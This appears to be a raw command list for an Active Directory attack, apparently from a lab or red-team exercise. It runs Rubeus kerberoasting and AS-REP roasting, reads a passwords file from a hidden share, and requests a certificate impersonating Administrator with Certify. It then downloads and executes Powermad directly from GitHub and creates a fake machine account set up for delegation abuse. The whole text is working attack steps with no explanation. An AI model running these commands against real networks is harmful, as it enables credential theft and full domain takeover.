klist purge
cd C:\malware\Ghostpack-CompiledBinaries-master\Ghostpack-CompiledBinaries-master\
.\Rubeus kerberoast
.\Rubeus asreproast
Get-Content \\enterprise-fs.enterprise.local\sensitive$\passwords.txt
.\Certify.exe request /ca:enterprise-dc.enterprise.local\enterprise-ENTERPRISE-DC-CA /template:ENTERPRISE-SmartCard /altname:Administrator

iex (iwr https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1)

$computername = "FAKE-PC-$(get-date -format('hhmm'))"
New-MachineAccount -MachineAccount $computername -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Set-ADComputer $computername -PrincipalsAllowedToDelegateToAccount "$computername`$"
